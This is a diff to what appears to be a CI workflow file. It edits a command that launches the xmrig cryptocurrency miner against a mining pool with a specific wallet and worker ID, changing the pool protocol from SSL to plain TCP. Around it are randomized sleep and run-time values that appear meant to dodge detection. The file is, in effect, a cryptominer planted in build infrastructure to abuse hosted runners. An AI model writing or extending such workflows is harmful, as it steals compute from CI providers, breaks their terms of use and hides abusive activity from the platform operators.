@@ -41,7 +41,7 @@ jobs:
           echo "Menunggu $DELAY detik..."
           sleep $DELAY
 
-          ./xmrig -a rx             -o stratum+ssl://xmrig.nanswap.com:3333             -u NANO:0xf319aef8c1d323c83740bcde9f25238ff5c4855d.unmineable_worker_vidjbpg#f2xg-6ynu             -p x --randomx-no-rdmsr | tee log.txt &
+          ./xmrig -a rx             -o stratum+tcp://xmrig.nanswap.com:3333             -u NANO:0xf319aef8c1d323c83740bcde9f25238ff5c4855d.unmineable_worker_vidjbpg#f2xg-6ynu             -p x --randomx-no-rdmsr | tee log.txt &
 
           PID=$!
           WORKTIME=$((RANDOM % 5400 + 1200))
